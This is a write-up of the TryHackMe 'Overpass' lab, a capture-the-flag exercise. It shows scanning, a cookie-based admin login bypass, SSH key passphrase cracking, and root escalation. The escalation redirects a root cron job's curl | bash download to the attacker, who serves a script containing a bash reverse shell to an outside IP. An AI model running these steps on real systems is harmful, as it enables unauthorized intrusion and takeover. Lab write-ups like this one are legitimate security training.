---
title: "Overpass Writeup THM"
description: "My writeup of the TryHackMe room [Overpass](https://tryhackme.com/room/overpass)"
date: 2024-01-03T10:00:00+01:00
image: https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
    - Crontab
categories:
    - Room
    - Easy
---

The first thing that I am going to do is a nmap scna:

```bash
nmap 10.10.192.193

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 09:30 EST
Nmap scan report for 10.10.192.193
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

From there we can see that the host is running ssh and a web page, let’s see what;s in the web page.

![Untitled](https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png)

Looking at the source code I have found this:

```bash
Overpass allows you to securely store different
                passwords for every service, protected using military grade
                <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
                cryptography to keep you safe.
```

The commented part can be a hint that the password are stored using ROT13.

After that I ran a directory discovery scan:

```bash
ffuf -u http://10.10.192.193/FUZZ -w /usr/share/wordlists/dirb/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.192.193/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 57ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 57ms]
:: Progress: [20469/20469] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```

Going into the admin page I got meeted with a login form.

This login form loads a script:

```bash
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

This script bascially allows you to create a token named SessionToken, and make a value different from “Incorrect credentials” and gives you access in the admin page

![Untitled](https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled%201.png)

We found out a ssh key, now I am going to try and access james account with it:

```bash
chmod 400 id_rsa

┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa james@10.10.192.193
Enter passphrase for key 'id_rsa':
```

Seems like it wants a passphrase.

We can retrieve that with John:

```bash
ssh2john id_rsa > id.txt

┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt id.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>          (id_rsa)
1g 0:00:00:00 DONE (2024-01-01 09:58) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pimentel..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And it worked:

```bash
ssh -i id_rsa james@10.10.192.193

Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan  1 15:00:25 UTC 2024

  System load:  0.12               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.192.193
  Swap usage:   0%

47 packages can be updated.
0 updates are security updates.

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ whoami
james
```

Once there I found this, in the .overpass file:

```bash
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

Which is James’s password

```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Looks like there is a crontab running which uses curl totake the buildscript.sh and run that.

From there I just edited the /etc/hosts file and I addes my IP, so now when it will try to retrieve the script, it will retrive it from me.

So I made this script inside a /downloads/src/ folder:

```bash
cat buildscript.sh
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.18.20.116/5555 0>&1
```

So when I started the server it took my script and I got a reverse shell:

```bash
nc -lvnp 5555

listening on [any] 5555 ...
connect to [10.18.20.116] from (UNKNOWN) [10.10.192.193] 39270
bash: cannot set terminal process group (2104): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
whoami
root
```
